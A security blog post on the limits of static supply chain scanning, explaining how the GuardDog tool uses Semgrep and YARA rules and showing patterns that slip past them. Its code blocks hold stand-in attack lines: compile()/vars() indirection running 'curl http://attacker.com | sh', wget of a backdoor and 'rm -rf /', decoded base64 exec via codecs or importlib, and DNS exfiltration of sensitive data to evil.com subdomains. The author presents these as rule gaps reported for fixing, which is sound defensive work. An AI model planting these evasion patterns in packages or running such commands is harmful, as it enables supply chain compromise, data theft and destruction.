---
layout: blog
type: blog
title: "The False Sense of Security in Supply Chain Scanning"
description: "Exploring the limitations of static analysis in detecting supply chain attacks. How GuardDog uses Semgrep and YARA to detect malicious packages, and techniques to evade detection through code execution, base64 payloads, and DNS exfiltration."
keywords: "supply chain attacks, SAST, static analysis, GuardDog, Semgrep, YARA, malicious packages, PyPI security, npm security, code execution detection, base64 obfuscation, DNS exfiltration, DevSecOps, software supply chain security"
author: "Charbel Farhat"
date: 2026-01-07
published: true
labels:
  - Supply Chain Attacks
  - DevSecOps
  - SAST
  - GuardDog
  - semgrep
  - YARA
  - PyPI
  - npm
---

![Banner](../img/SAST-and-supply-chain-attacks/banner.png)

Modern software is built on layers of third-party dependencies, CI/CD tooling, and external services. Supply chain attacks exploit this trust by compromising components upstream, allowing malicious code to spread downstream into otherwise legitimate applications.

The impact and frequency of these attacks have grown so significantly that OWASP Top 10 (2025) ranks A03:2025 – Software Supply Chain Failures as the 3rd most critical application security risk. From poisoned open-source packages to compromised build pipelines, supply chain security is no longer a niche concern—it’s a core part of modern threat modeling.

## GuardDog and the Limitations of Static Analysis Tools

To counter the rise of supply chain attacks, organizations increasingly rely on automated security tooling to analyze dependencies before they reach production. [GuardDog](https://github.com/DataDog/guarddog), an open-source tool maintained by Datadog, aims to detect malicious packages in ecosystems like PyPI and npm by statically analyzing package code and metadata for suspicious patterns and known attack techniques. This approach is effective at catching common and previously observed threats, raising the baseline security of dependency usage.

However, malicious packages are fundamentally hard to detect. They are often deliberately crafted to appear benign—delaying execution, hiding behavior behind environment checks, or using legitimate APIs and obfuscation in ways that evade static signatures. When analyzed in isolation, many such packages show little that clearly distinguishes them from legitimate code.

This highlights a broader limitation of SAST in the supply chain. Static analysis lacks runtime context and intent, making it difficult to determine how or when a dependency will behave maliciously. As a result, detection often happens only after trust has already been granted, leaving sophisticated supply chain attacks able to slip past even well-designed scanning tools. Not to mention the fact that static analysis fails miserably against novel obfuscation schemes and attack tachniques.

## How GuardDog Detects Potentially Malicious Packages

GuardDog approaches supply chain security as a **static analysis problem**, focusing on identifying *risk signals* in packages before they are installed or executed. Rather than attempting full behavioral emulation, it relies on **pattern-based detection** rooted in real-world supply chain attack techniques.

At its core, GuardDog combines multiple static analysis mechanisms, most notably **Semgrep rules** and **YARA-style signatures**, alongside package metadata inspection.

### Static Code Analysis with Semgrep

GuardDog uses **Semgrep** to scan source files for syntactic and semantic patterns that are commonly associated with malicious behavior. *Semgrep*’s AST-aware matching allows GuardDog to detect risky constructs even when variable names or code layout change.

These rules typically target:
- Code execution during installation (e.g., `setup.py`, `postinstall` hooks)
- Use of high-risk APIs such as filesystem writes, process spawning, or dynamic imports
- Network-related operations embedded in dependency code
- Control-flow patterns that indicate staged or conditional execution

Because Semgrep operates at the syntax tree level, it is more resilient than simple string matching, but it still remains constrained to *what is statically visible in the code*.

### Signature-Based Detection with YARA

In addition to Semgrep, GuardDog leverages **YARA-like rules** to identify known malicious artifacts and suspicious byte or string patterns. This includes:
- Encoded or encrypted payloads
- Embedded shell commands
- Hardcoded URLs, IPs, or command-and-control indicators
- Reused fragments from previously identified malicious packages

YARA-style matching is particularly effective for catching commodity or copy-pasted malware, but it is inherently retrospective—it works best against patterns that have already been observed.

### Metadata and Heuristic Signals

Beyond code inspection, GuardDog evaluates **package metadata and contextual signals**, such as:
- Recently published packages with little adoption history
- Typosquatting indicators (name similarity to popular packages)
- Abnormal versioning or publishing behavior
- Mismatch between claimed functionality and code complexity

These signals are used to provide additional context and help prioritize findings.

### A Risk-Scoring Approach, Not a Verdict

GuardDog does not rely on a single rule or signature to declare a package malicious. Instead, findings emerge from the **aggregation of multiple weak signals** across code, signatures, and metadata. This reduces false positives but also means that subtle or well-camouflaged threats may not cross the detection threshold.

Crucially, all of this analysis happens **without executing the package**. While this makes GuardDog safe, fast, and scalable, it also reinforces a fundamental limitation: static analysis can identify suspicious *capability*, but not *intent* or *runtime behavior*. This trade-off is central to understanding both the strengths and blind spots of SAST-based supply chain defenses.

## Evading the GuardDog

I was interested in contributing to GuardDog as an open-source project, which led me to evaluate and refine its detection rules based on malicious patterns I’ve encountered while reverse-engineering Python packages used in supply chain attacks.

### Evading Code Execution Detection

One of the most common behaviors observed in malicious packages is **automatic code execution** during installation. Examining `guarddog/analyzer/sourcecode/code-execution.yml`, we can see the set of code execution patterns that GuardDog is can detect in PyPI packages.

In this context, code execution refers to the use of dangerous functions such as `exec()`, `eval()`, `os.system()`, and similar primitives. GuardDog intentionally limits these checks to files like `setup.py` and `__init__.py`, where malicious packages most commonly trigger execution. This scoping is a deliberate design choice to reduce false positives, as scanning for code execution patterns across an entire package would flag many legitimate use cases and significantly increase noise.

We notice that there are no patterns to detect `compile()` and `vars()` indirection and both of these primitives can help us evade code execution detection. All we have to do is use one of the followwing:

```python
# These are just examples of how command execution in setup.py looks like
compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
compile("subprocess.Popen('powershell -EncodedCommand cABvAHc=', shell=False)", '<string>', 'eval')
vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/backdoor.sh')")
vars(__builtins__).get('eval')("__import__('os').popen('curl http://attacker.com | sh')")
vars(__builtins__).get('compile')("os.system('rm -rf /')", '<string>', 'exec')
vars(globals()['__builtins__'])['exec']("os.system('malicious command')")
```

I've already opened a PR which will add the ability to detect code execution via `compile()` and `vars()` indirection.


### Evading base64 execution detection

Another common behavior in malicious packages is the execution of a decoded base64 payload. GuardDog attempts to detect such attempts in all files (not just in `setup.py` and `__init__.py` files) and it does so using *semgrep*'s taint analysis to track the flow of tainted data throughout the body of a function. Base64 execution can look something like this: `exec(base64.b64decode(<base_64_payload>))`. In this case, the source is `base64.b64decode("...")` and the sink is `exec()`. By looking at `guarddog/analyzer/sourcecode/exec-base64.yml` we can see all sources and sinks that GuardDog can detect when it comes to detecting base64 execution.

We can immediately notice that the common `codecs.decode()` source is missing, and so is the ability to detect dynamic imports of `base64` and `codecs` via `importlib`. Both of these methods can be used to evade base64 execution detection. We can use one of the following to achieve that:

```python
import codecs
exec(codecs.decode("<base64_payload>", 'base64'))
exec(codecs.decode("<base64_payload>", 'BASE-64'))

import importlib
exec(importlib.import_module('base64').b64decode("<base64_payload>"))
exec(importlib.import_module('codecs').decode("<base64_payload>", 'base64'))
```

I've already opened a PR to address these issues.

Note that malware authors use mutliple encoding schemes (hex, base64, base32...) but base64 remains the most popular choice and the one you'll most tlikely come across when reverse engineering and analyzing malware (especially malware used for supply chain attacks).

### Evading Data Exfiltration Detection

GuardDog also includes detection logic for sensitive data exfiltration, focusing primarily on obvious outbound channels such as HTTP requests, hardcoded endpoints, or direct use of networking libraries to transmit data off-host. These checks are effective at flagging unsophisticated malware that exfiltrates credentials, environment variables, or system data using straightforward network calls.

However, this approach has limitations. One notable gap is the lack of detection for DNS-based exfiltration, a technique commonly used by malware to evade network monitoring and static analysis. By encoding data into DNS queries and relying on standard name resolution APIs, malicious code can leak information while appearing indistinguishable from normal application behavior. From a static analysis perspective, these patterns are difficult to differentiate from legitimate DNS usage, and as a result they often fall outside the scope of GuardDog’s current exfiltration heuristics. This highlights a broader challenge in supply chain security: attackers increasingly favor low-signal, protocol-abusing techniques that blend into normal behavior and are inherently hard to catch with static analysis.

Looking at `guarddog/analyzer/sourcecode/exfiltrate-sensitive-data.yml` we notice that GuardDog uses taint analysis to detect data flow from specific sources to specific sinks. Also, we notice that there are no sinks that atetmpt to detect data exfiltration via DNS requests. So we can evade detection by using any of the following:

```python
import socket
socket.gethostbyname(f"{<sensitive_data>}.evil.com")
socket.getaddrinfo(f"{<sensitive_data>}.evil.com", 80)
socket.gethostbyname_ex(f"{<sensitive_data>}.evil.com")

import dns.resolver
dns.resolver.query(f"{<sensitive_data>}.evil.com", 'A')
dns.resolver.resolve(f"{<sensitive_data>}.evil.com", 'A')

resolver = dns.resolver.Resolver()
resolver.query(f"{<sensitive_data>}.evil.com", 'A')

resolver = dns.resolver.Resolver()
resolver.resolve(f"{<sensitive_data>}.evil.com", 'A')

import aiodns
async def exfil():
    resolver = aiodns.DNSResolver()
    await resolver.query(f"{<sensitive_data>}.evil.com", 'A')
```

I've already opened a PR to address the lack of data exfiltration detection via DNS requests.

## Final Observations

One of the fundamental challenges in detecting malicious packages is the sheer flexibility of software itself. There are countless ways to achieve the same outcome in code, and with even minor deviations, dded indirection, randomness, or unconventional control flow—static analysis quickly begins to struggle.

This is not a failure of tools like GuardDog and Semgrep, but a limitation of the model they operate in. Pattern-based detection can only reason about what it has seen before, and adversaries actively optimize for being just different enough to evade those patterns. As supply chain attacks continue to evolve, effective defense will require layering static analysis with contextual, behavioral, and ecosystem-level signals rather than relying on any single approach to catch everything.

The implication is clear: no single control is sufficient. Supply chain security requires defense in depth, combining static analysis with runtime protections, provenance and integrity checks, network monitoring, and human review. Static tools raise the bar, but layered defenses are what make exploitation meaningfully harder in practice.